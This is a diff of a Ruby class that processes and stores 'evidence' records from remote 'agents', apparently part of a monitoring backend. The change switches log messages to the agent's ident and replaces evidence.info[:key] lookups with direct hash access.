@@ -85,7 +85,7 @@ class InstanceProcessor
   
   def queue(id)
     @evidences << id unless id.nil?
-    trace :info, "queueing evidence id #{id} for agent #{@agent['instance']}"
+    trace :info, "queueing evidence id #{id} for agent #{@agent['ident']}"
     
     process = Proc.new do
       resume
@@ -122,7 +122,7 @@ class InstanceProcessor
             end
 
             if evidences.nil?
-              trace :debug, "error deserializing evidence #{evidence_id} for agent #{@agent['instance']}, skipping ..."
+              trace :debug, "error deserializing evidence #{evidence_id} for agent #{@agent['ident']}, skipping ..."
               next
             end
             
@@ -130,31 +130,31 @@ class InstanceProcessor
             
             evidences.each do |evidence|
 
-              puts "EVIDENCE DATA #{evidence.info[:data]}"
+              puts "*** TYPE #{evidence[:type]}"
 
               # store evidence_id inside evidence, we need it inside processors
-              evidence.info[:db_id] = evidence_id
+              evidence[:db_id] = evidence_id
               
               # delete empty evidences
               if evidence.empty?
                 #RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @agent['instance'])
-                trace :debug, "deleted empty evidence for agent #{@agent['instance']}"
+                trace :debug, "deleted empty evidence for agent #{@agent['ident']}"
                 next
               end
               
               # store agent instance in evidence (used when storing into db)
-              evidence.info[:instance] = @agent['instance']
-              evidence.info[:ident] = @agent['ident']
+              evidence[:instance] = @agent['instance']
+              evidence[:ident] = @agent['ident']
               
-              trace :debug, "Processing evidence of type #{evidence.info[:type]}"
+              trace :debug, "Processing evidence of type #{evidence[:type]}"
               
               # find correct processing module and extend evidence
-              mod = "#{evidence.info[:type].to_s.capitalize}Processing"
+              mod = "#{evidence[:type].to_s.capitalize}Processing"
               evidence.extend eval mod if RCS.const_defined? mod.to_sym
               evidence.process if evidence.respond_to? :process
               
               # override original type
-              evidence.info[:type] = evidence.type
+              evidence[:type] = evidence.type
               
               #store_evidence evidence
               parsed = evidence.store
@@ -164,7 +164,7 @@ class InstanceProcessor
               #
               
               processing_time = Time.now - start_time
-              trace :info, "processed #{evidence.info[:type].upcase} in #{processing_time} sec"
+              trace :info, "processed #{evidence[:type].upcase} for agent #{@agent['ident']} in #{processing_time} sec"
             end
             
             RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
